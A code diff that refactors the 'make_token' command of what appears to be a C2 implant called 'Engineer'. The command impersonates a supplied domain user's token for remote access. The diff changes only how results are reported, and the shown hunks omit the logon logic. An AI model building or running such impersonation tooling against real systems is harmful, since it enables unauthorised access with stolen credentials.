@@ -6,6 +6,7 @@ using System.Text;
 using System.Threading.Tasks;
 using Engineer.Models;
 using Engineer.Extra;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -13,7 +14,7 @@ namespace Engineer.Commands
     {
         public override string Name => "make_token";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             if (task.Arguments.TryGetValue("/username", out string username))
             {
@@ -54,19 +55,22 @@ namespace Engineer.Commands
                         //Program.DealWithTask(ls);
                         Program.ImpersonatedUser = identity;
                         Program.ImpersonatedUserChanged = true;
-                        return $"Successfully impersonated {domain}\\{username} for remote access, still {identity.Name} locally";
+                        Tasking.FillTaskResults($"Successfully impersonated {domain}\\{username} for remote access, still {identity.Name} locally",task,EngTaskStatus.Complete);
+                        return;
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                         Console.WriteLine(ex.StackTrace);
-                        return (ex.Message);
+                        Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed);
+                        return;
                     }
 
                 }
-                return "error: " + "created token but Failed to imersonate user";
+                Tasking.FillTaskResults("error: " + "created token but Failed to imersonate user",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
-            return "error: " + "Failed to make token";
+            Tasking.FillTaskResults("error: " + "Failed to make token",task,EngTaskStatus.FailedWithWarnings);
         }
     }
 }
